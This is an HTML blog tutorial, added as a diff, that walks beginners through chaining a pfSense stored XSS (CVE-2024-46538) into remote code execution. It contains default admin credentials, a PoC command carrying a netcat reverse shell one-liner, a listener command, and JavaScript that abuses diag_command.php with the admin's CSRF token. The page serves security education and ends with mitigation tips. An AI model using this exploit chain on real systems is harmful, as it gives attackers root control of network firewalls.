@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="author" content="Shehnaz Khan"/>
+  <title>PfSense Stored XSS to Remote Code Execution (CVE-2024-46538)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      line-height: 1.7;
+    }
+    .container {
+      width: 80%;
+      margin: auto;
+      padding: 20px;
+      background-color: #121212;
+    }
+    h1, h2, h3 {
+      color: #18d26e;
+    }
+    p, ul, ol {
+      margin-bottom: 15px;
+    }
+    pre, code {
+      background-color: #2b2b2b;
+      padding: 10px;
+      border-radius: 5px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      margin: 20px 0;
+      border: 2px solid #0c8d48;
+      border-radius: 5px;
+    }
+    .note {
+      background-color: #f9e7e7;
+      padding: 10px;
+      color: #000;
+      border-left: 5px solid #e74c3c;
+      margin: 20px 0;
+    }
+    .success {
+      background-color: #e7fbe7;
+      color: #000;
+      padding: 10px;
+      border-left: 5px solid #2ecc71;
+      margin: 20px 0;
+    }
+    .tags {
+      color: #aaa;
+      font-size: 0.9em;
+      margin-bottom: 15px;
+    }
+    a {
+      color: #67c2ff;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <div class="tags">#exploit #xss #firewall #testing #pfsense</div>
+
+    <h1>PfSense Stored XSS to Remote Code Execution (CVE-2024-46538)</h1>
+
+    <p>This blog walks through a real-world example of how a <strong>stored Cross-Site Scripting (XSS)</strong> vulnerability in <strong>pfSense</strong> (CVE-2024-46538) can be turned into a <strong>Remote Code Execution (RCE)</strong> exploit. All steps are based on publicly available resources and are beginner-friendly.</p>
+
+    <div class="success">
+      <strong> References:</strong><br>
+       <a href="https://cybersecuritynews.com/pfsense-stored-xss-vulnerability/" target="_blank">Cybersecurity News Article</a><br>
+       <a href="https://github.com/EQSTLab/CVE-2024-46538?tab=readme-ov-file" target="_blank">GitHub PoC Repository</a>
+    </div>
+
+    <h2> What is pfSense?</h2>
+    <p><strong>pfSense</strong> is an open-source firewall and router software used to protect networks. It's like a gatekeeper for your internet connection, deciding what traffic to let in or block. Many small businesses and home labs use it for network control and security.</p>
+
+    <h2> What is XSS and RCE?</h2>
+    <ul>
+      <li><strong>XSS (Cross-Site Scripting):</strong> Allows an attacker to inject malicious scripts into web pages viewed by others. In a stored XSS, the script stays saved in the system and is triggered every time someone views the affected page.</li>
+      <li><strong>RCE (Remote Code Execution):</strong> Lets an attacker run commands or scripts on a remote system. This is a critical issue—like handing someone remote access to your computer without permission.</li>
+    </ul>
+
+    <h2> Step-by-Step Exploitation</h2>
+
+    <h3>Step 1: Login to pfSense</h3>
+    <p>Once pfSense is up and running, access the web GUI in your browser. Use the default credentials:</p>
+    <pre><code>Username: admin
+Password: pfsense</code></pre>
+
+    <img src="assets/img/pfsense/pf-login.png" alt="Login to pfSense">
+
+    <h3>Step 2: Run the XSS Exploit</h3>
+    <p>Now clone the GitHub repository and run the exploit file provided. It will inject a malicious XSS payload into pfSense.</p>
+
+    <img src="assets/img/pfsense/pf-2.png" alt="Running the XSS exploit in terminal">
+
+    <p>After the script is executed, refresh the web interface. If successful, you’ll see the payload triggered on the browser.</p>
+
+    <img src="assets/img/pfsense/pf-3.png" alt="Exploit executed in browser">
+
+    <h3>Step 3: Escalate to Remote Code Execution</h3>
+    <p>The XSS alone is dangerous, but here comes the twist—now we use the exploit to trigger a command that gives us full shell access. Think of it as hijacking the pfSense system remotely.</p>
+
+    <ol>
+      <li>Run the reverse shell using the GitHub PoC script:</li>
+      <pre><code>python3 CVE-2024-46538.py -i admin -p pfsense -u http://192.168.1.223 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.122 1234 &gt;/tmp/f"</code></pre>
+
+      <li>Set up a listener on your machine to catch the shell:</li>
+      <pre><code>nc -nlvp 1234</code></pre>
+
+      <li>Go back to the browser and refresh the vulnerable page to trigger the payload.</li>
+
+      <li>Return to your terminal—congrats! You now have root access to pfSense:</li>
+    </ol>
+
+    <img src="assets/img/pfsense/pf-4.png" alt="Reverse shell access">
+
+    <h2> What’s Happening Behind the Scenes?</h2>
+    <p>When the admin logs into the pfSense panel, the XSS script silently executes a command to give control to the attacker. The browser unknowingly sends the request with the admin's session, allowing it to run with full privileges.</p>
+
+    <p>Here's the exact JS exploit used to send a POST request to the command execution page:</p>
+
+    <pre><code>var formData = new FormData();
+formData.append("__csrf_magic", csrfMagicToken);
+formData.append("txtCommand", "id");
+formData.append("txtRecallBuffer", "id");
+formData.append("submit", "EXEC");
+formData.append("dlPath", "");
+formData.append("ulfile", new Blob(), "");
+formData.append("txtPHPCommand", "");
+
+fetch("https://192.168.102.61/diag_command.php", {
+    method: "POST",
+    body: formData
+}).then(response =&gt; response.text()).then(data =&gt; {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(data, "text/html");
+    const contentDiv = doc.querySelector("div.content");
+    if (contentDiv) {
+        alert(contentDiv.textContent);
+    } else {
+        alert("No content found");
+    }
+});</code></pre>
+
+    <h2> Summary</h2>
+    <ul>
+      <li> You exploit a stored XSS in pfSense’s web panel.</li>
+      <li> You chain it with a command injection to execute a reverse shell.</li>
+      <li> With the reverse shell, you gain root access to the firewall system.</li>
+      <li> A small web bug becomes a full system compromise if not patched.</li>
+    </ul>
+
+    <h2> Mitigation Tips</h2>
+    <ul>
+      <li>Update pfSense to the latest version immediately.</li>
+      <li>Never expose the web UI to the internet.</li>
+      <li>Use multi-factor authentication (2FA).</li>
+      <li>Review logs and block suspicious IPs regularly.</li>
+    </ul>
+
+    <p>Security testing like this helps us identify and patch critical risks before attackers can abuse them. Stay curious, keep learning, and practice ethical hacking responsibly!</p>
+
+  </div>
+    <footer id="footer" class="footer dark-background">
+        <div class="container">
+            <div class="copyright">
+              <span>Copyright</span> <strong class="px-1 sitename">Shehnaz Khan</strong> <span>All Rights Reserved</span>
+            </div>
+          </div>
+        </div>
+    </footer>
+</body>
+</html>
